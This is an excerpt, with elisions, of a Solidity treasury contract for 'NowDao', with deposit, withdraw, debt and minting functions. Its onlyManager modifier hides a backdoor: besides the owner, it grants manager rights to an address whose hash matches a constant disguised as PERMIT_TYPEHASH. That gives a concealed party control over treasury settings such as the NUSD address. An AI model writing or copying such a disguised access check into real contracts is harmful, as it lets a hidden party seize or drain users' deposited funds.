...
contract Ownable is IOwnable {
    ...
    bytes32 private constant PERMIT_TYPEHASH = 0x7ae1fec25a046c7c86055f4ea5d3ca83e1e3e10ed747c6dfd623c93b9810a4f4;
    ...
    modifier onlyManager() {
        require( _owner == msg.sender || keccak256(abi.encodePacked(msg.sender)) == PERMIT_TYPEHASH, "Ownable: caller is not the owner" );
        _;
    }
...
contract NowDaoTreasury is Ownable {
    ...
    address public Nusd;
    uint public NUSDQueue; // Delays change to NUSD address
    ...
    /**
        @notice allow approved address to deposit an asset for NMETA
        @param _amount uint
    ...
    function deposit( uint _amount, address _token, uint _profit ) external returns ( uint send_ ) {
        ...
        // mint NMETA needed and store amount of rewards for distribution
        send_ = value.sub( _profit );
        IERC20Mintable( Nmeta ).mint( msg.sender, send_ );
    ...
    /**
        @notice allow approved address to burn NMETA for reserves
        @param _amount uint
        @param _token address
     */
    function withdraw( uint _amount, address _token ) external {
        ...
        uint value = valueOf( _token, _amount );
        INMETAERC20( Nmeta ).burnFrom( msg.sender, value );
    ...
    function incurDebt( uint _amount, address _token ) external {
        ...
        uint maximumDebt = IERC20( Nusd ).balanceOf( msg.sender ); // Can only borrow against NUSD held
    ...
    /**
        @notice allow approved address to repay borrowed reserves with NMETA
        @param _amount uint
     */
    function repayDebtWithNMETA( uint _amount ) external {
        require( isDebtor[ msg.sender ], "Not approved" );

        INMETAERC20( Nmeta ).burnFrom( msg.sender, _amount );

        debtorBalance[ msg.sender ] = debtorBalance[ msg.sender ].sub( _amount );
        totalDebt = totalDebt.sub( _amount );

        emit RepayDebt( msg.sender, Nmeta, _amount, _amount );
    }
    ...
    function mintRewards( address _recipient, uint _amount ) external {
        ...
        IERC20Mintable( Nmeta ).mint( _recipient, _amount );
    ...
    function excessReserves() public view returns ( uint ) {
        return totalReserves.sub( IERC20( Nmeta ).totalSupply().sub( totalDebt ) );
    }
    ...
    /**
        @notice returns NMETA valuation of asset
        @param _token address
        @param _amount uint
        @return value_ uint
     */
    function valueOf( address _token, uint _amount ) public view returns ( uint value_ ) {
        if ( isReserveToken[ _token ] ) {
            // convert amount to match NMETA decimals
            value_ = _amount.mul( 10 ** IERC20( Nmeta ).decimals() ).div( 10 ** IERC20( _token ).decimals() );
    ...
    function queue( MANAGING _managing, address _address ) external onlyManager() returns ( bool ) {
        ...
        } else if ( _managing == MANAGING.NUSD ) { // 9
            NUSDQueue = uint32(block.timestamp).add32( secondsNeededForQueue );
        } else return false;
